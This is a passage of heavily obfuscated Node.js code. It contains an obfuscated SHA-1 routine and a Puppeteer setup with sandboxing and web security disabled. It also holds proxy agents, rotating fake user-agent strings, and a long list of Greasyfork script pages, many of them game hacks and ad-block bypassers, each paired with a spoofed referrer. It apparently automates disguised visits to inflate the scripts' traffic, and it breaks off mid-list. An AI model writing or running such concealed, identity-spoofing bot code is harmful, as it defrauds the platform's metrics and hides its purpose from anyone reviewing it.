(0xb * -0x5e22c47 + 0x5dee36de + -0x6f6d9 * -0x381) + B[u + (-0x1201 * -0x1 + -0x1b20 + 0x921)] << 0x19a5 + -0x144c + 0x25 * -0x25) << -0xfcf + -0xaa + 0x2 * 0x83f | y >>> 0xe * 0x209 + 0x6e + -0x1cd1) + (z ^ (A = A << 0xb * 0x1eb + -0xc67 + 0x9 * -0xf4 | A >>> 0x7c7 + -0x54 * 0x74 + 0x1e4b) ^ w) + x - (-0x52c90c98 + 0x686e88c6 + -0x6 * -0x553f5aa) + B[u + (0x12a * 0x1d + 0x8 * -0x290 + -0xd3f)] << 0x21d5 + 0x1978 + -0x37d * 0x11) << 0x1 * -0x21d5 + -0xbaa + -0x1 * -0x2d84 | x >>> 0x24fe + 0x46c * -0x8 + -0x183) + (y ^ (z = z << -0x1 * 0x178b + 0xa7c + 0xd2d | z >>> 0x72f + 0x2633 + -0x2d60) ^ A) + w - (0x5fb66525 + -0x4161f62 * -0x13 + -0x77bd7b41) + B[u + (-0x2399 + -0xedd + -0x3e2 * -0xd)] << 0xa7 * 0x13 + -0x2 * -0x633 + -0x18cb, y = y << -0x1f19 + 0xb1 * -0x1a + 0x707 * 0x7 | y >>> -0x5 * 0x1cf + 0x1ee8 + -0x15db;
          this['h0'] = this['h0'] + w << 0x2cc * -0x2 + 0x2192 + -0x1bfa, this['h1'] = this['h1'] + x << 0x74b + -0x1 * 0x1421 + -0x1f * -0x6a, this['h2'] = this['h2'] + y << -0x1a1e + -0x8b * -0x25 + 0x607, this['h3'] = this['h3'] + z << 0xbaf * -0x3 + 0x26bd + -0x3b0, this['h4'] = this['h4'] + A << -0x6f * 0x15 + 0xed5 * -0x2 + 0x26c5;
        }
        ['hex']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return f[u >> -0xe6e + 0x11fb + -0x371 * 0x1 & 0x2 * -0x4e6 + -0x1655 + -0x2 * -0x1018] + f[u >> 0x2144 * -0x1 + -0x1 * 0x1d7b + 0x3ed7 & -0x120 + 0x16c4 + 0x145 * -0x11] + f[u >> 0x2 * -0x725 + -0x22a5 * -0x1 + -0xb3 * 0x1d & 0xc81 + 0x1b71 + -0x27e3 * 0x1] + f[u >> 0x1d12 + -0x1968 + -0x39a * 0x1 & -0x815 * 0x2 + -0x175e + -0x5 * -0x7eb] + f[u >> -0xcf3 + -0x12bb + 0x1fba & -0x22e8 + 0x2341 + -0x4a] + f[u >> 0x49e + 0x1 * 0x1b1 + -0x647 & 0x2 * 0x557 + 0x1 * -0x17fd + 0x76 * 0x1d] + f[u >> -0x6 * -0x5cc + -0x3 * -0x83f + -0x3b81 & -0x2bd * 0xc + 0x1e62 + 0x289] + f[-0xc1c * -0x2 + 0x727 * 0x5 + -0x3bec & u] + f[v >> 0x36f + 0xddb * -0x2 + 0x1863 & 0x1676 + -0x157d + 0x12 * -0xd] + f[v >> -0x9f3 * -0x1 + 0x2 * -0x873 + 0x70b & -0x10cc + -0x1658 + -0x2733 * -0x1] + f[v >> -0x2 * -0x2c7 + 0x6fd + -0xc77 & -0x620 + -0x9 * 0x335 + 0x1186 * 0x2] + f[v >> 0xd * 0xd5 + 0x1f * 0x141 + -0xc68 * 0x4 & -0x4c3 + 0x15e3 + -0x1111] + f[v >> 0xbc * -0x17 + 0x173a + -0x64a & -0x3 * 0x449 + 0x12fe + -0x614] + f[v >> 0x1 * -0x26b + 0x123a + -0x1 * 0xfc7 & 0x27 * 0xa3 + 0xf9e + 0x4 * -0xa19] + f[v >> -0x198e + 0x1 * 0x251 + -0x1741 * -0x1 & 0x2 * 0x909 + -0x10ef + -0x114] + f[-0x2382 + 0x2 * 0x4b4 + 0x1a29 & v] + f[w >> -0xe9b * 0x1 + -0x481 + -0x28 * -0x7b & 0x2336 + 0x247f * -0x1 + 0x2b * 0x8] + f[w >> 0x1 * -0x1f07 + -0x1bbd + 0x3adc & 0x198d + 0x1 * -0x25f7 + -0x67 * -0x1f] + f[w >> 0x1dc9 + 0xa7b + -0x2830 & 0xf84 + -0xec5 * -0x1 + -0x6a * 0x49] + f[w >> -0x1177 + 0x2304 + 0x117d * -0x1 & -0x1 * 0x120d + 0x1e2b * 0x1 + -0x157 * 0x9] + f[w >> -0x674 + -0x1 * 0x113c + 0x17bc & -0x104a + -0x1d * 0x45 + -0xc15 * -0x2] + f[w >> 0x5 * 0x109 + -0x1a53 + 0x152e & -0xf8d + -0x2161 + 0x30fd] + f[w >> -0x17b * -0x4 + 0x1525 * -0x1 + 0xf3d & 0x23ad + -0xbcf + -0x17cf] + f[-0x6fd + 0x255a + 0x35e * -0x9 & w] + f[x >> -0x15c7 * 0x1 + 0x1900 + -0x31d & -0x5 * 0x4bb + 0x1a4f + -0x299] + f[x >> -0x241a + -0xaf5 + 0x2f27 & -0x32 * 0x53 + -0x1da7 * -0x1 + -0xd62] + f[x >> 0x8e1 + -0x262b + 0x1d5e & 0x1eab + -0x3b * 0x45 + -0xeb5] + f[x >> 0x1 * -0x1abb + 0xd4f + 0xd7c & 0x1423 + -0x1fd7 + 0xbc3 * 0x1] + f[x >> 0x2 * -0x9c8 + 0x1 * 0x1555 + -0x1b9 * 0x1 & 0x25f9 * 0x1 + -0x667 + -0x1f83 * 0x1] + f[x >> 0xdae + 0x148 * -0x1c + -0x472 * -0x5 & 0x5 * -0x3bf + 0x22d7 + 0x1 * -0x100d] + f[x >> 0x11b + -0x9b * -0x11 + -0x5b1 * 0x2 & 0xd79 + -0x951 + -0x419] + f[0x4c * -0x45 + -0x19c8 + -0x2e53 * -0x1 & x] + f[y >> -0x15a4 + 0x1d46 + -0x786 & 0x142e + 0x40 * 0x8a + -0x369f] + f[y >> -0x95 * -0x4 + 0x1afb + -0x1d37 * 0x1 & -0x1ce1 + 0xcb9 + -0x7 * -0x251] + f[y >> -0x5a0 + -0xc8b * 0x2 + 0x1eca & -0x13e6 + 0x2 * 0x911 + 0x1 * 0x1d3] + f[y >> 0x1fa + 0x702 + -0x8ec & 0x264b * 0x1 + 0x922 + -0x3 * 0xfca] + f[y >> -0xf6 + 0xfe9 + -0xee7 & -0x185c + 0x1 * -0xfb0 + 0x1 * 0x281b] + f[y >> -0x1a24 + 0x1a60 + 0x1a * -0x2 & 0x1cec + 0x227b + 0x1fac * -0x2] + f[y >> -0x34 * 0xba + 0x212 + 0x10d * 0x22 & 0x229 * 0x1 + -0x3a * 0x27 + 0x2 * 0x35e] + f[-0x5 * 0x1d2 + 0x395 * -0x3 + -0x62 * -0x34 & y];
        }
        ['digest']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return [
            u >> 0x342 + 0x13be + -0x8 * 0x2dd & -0x1d6f + -0x2 * -0x8a6 + 0xd22,
            u >> -0x3 * -0x8d + 0x8db * -0x1 + 0x744 & 0x164b + -0x148e + -0xbe,
            u >> -0x2 * -0xbd6 + 0x1 * 0x2f + -0x39 * 0x6b & 0x15c6 + 0x1f1d + -0x33e4,
            0x190e + 0x18b * -0x5 + -0x1058 & u,
            v >> 0x2b + -0x1d47 * -0x1 + 0x22 * -0xdd & -0x3ff + -0x6f + 0x56d,
            v >> 0x1d * -0xbf + 0x23b5 + -0xe02 & -0x18f6 + 0x1dc * -0x14 + 0x3f25,
            v >> 0x292 * -0x2 + 0x96 * 0x1 + -0x24b * -0x2 & -0x745 + 0x1d1d + 0x9 * -0x251, -0x21db + 0x1a5 * 0x1 + 0x2135 & v,
            w >> 0x1 * -0xfc4 + 0x26dd * -0x1 + 0x36b9 * 0x1 & -0x1 * -0x10bd + -0x19c * -0x10 + -0xe2 * 0x2f,
            w >> 0x1c52 + -0x112f + -0x15 * 0x87 & -0x6b5 * 0x1 + -0x16ed + -0x1 * -0x1ea1,
            w >> 0x1 * 0x1df7 + -0x2625 + 0x836 & -0x2 * 0xa3b + -0x1 * 0x1ab1 + -0x3026 * -0x1,
            0x20f2 + 0x1d71 + -0x2 * 0x1eb2 & w,
            x >> 0xa3 * -0x29 + -0x61c + -0x1 * -0x204f & -0x17ac + -0x2 * -0xe63 + -0x41b,
            x >> -0x624 + -0x2 * -0x5e2 + 0x59 * -0x10 & -0x13c5 + -0x5b3 + -0x5 * -0x54b,
            x >> -0x1 * 0x20b9 + 0x21f8 + -0x137 & 0x2 * 0xc53 + -0x2020 + 0xf1 * 0x9, -0xeb * 0x29 + -0xd28 + 0x19e5 * 0x2 & x,
            y >> 0x1568 + -0x49 * -0x2f + 0x22b7 * -0x1 & -0x1b12 + -0xd91 + 0x29a2,
            y >> 0x1bef + 0x6d1 * 0x5 + -0x3df4 & -0x1d41 * -0x1 + -0x52 * -0x12 + -0x29e * 0xd,
            y >> 0x1b29 * 0x1 + 0x1b8e + -0x1 * 0x36af & 0x1bc8 + 0x1bbb + 0xc * -0x48b, -0x2414 + -0x1c5 + -0x1c4 * -0x16 & y
          ];
        }
        ['arrayBuffe' + 'r']() {
          const L = c;
          var r, s;
          return this['finalize'](), r = new ArrayBuffer(0x1efc + 0x98d * 0x1 + 0x1 * -0x2875), (s = new DataView(r))[L(0x6)](-0x3 * -0x9a1 + -0x22b4 + -0x5d1 * -0x1, this['h0']), s['setUint32'](-0x13a * 0x1b + 0x1dc2 * -0x1 + 0x2 * 0x1f72, this['h1']), s['setUint32'](0x71f * -0x4 + 0x3b * 0x17 + 0x1737, this['h2']), s['setUint32'](-0x195b * -0x1 + -0x1 * -0x1e14 + -0x3763, this['h3']), s['setUint32'](0x10 * -0x1e5 + 0x138c + 0xad4, this['h4']), r;
        }
    }
    p['prototype']['toString'] = p['prototype']['hex'], p['prototype']['array'] = p['prototype']['digest'];
    const q = l();
    return q;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = -0xfa0 + -0x5aa6 + 0x9926 + (0x1 * -0x17d7 + 0x63a + 0x1d55) * random(),
  MM_NETWORK_PATIENCE = (0x2 * 0x785 + 0x1aaa + 0x29b1 * -0x1) * NETWORK_PATIENCE,
  me = random()['toString'](0x1 * -0x1aa7 + -0x21af + 0x3c66)['substring'](-0x15f3 + -0x49 * 0x49 + -0x1 * -0x2ac8, -0x15eb * 0x1 + -0xbd2 + 0x21c7),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + M(0x9) + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + N(0x1) + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + M(0x4) + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + N(0x1) + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': O(0xf, '4@oI') + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + N(0xd) + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + M(0xa) + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + O(0x1a, '4@oI') + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      M(0x16) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
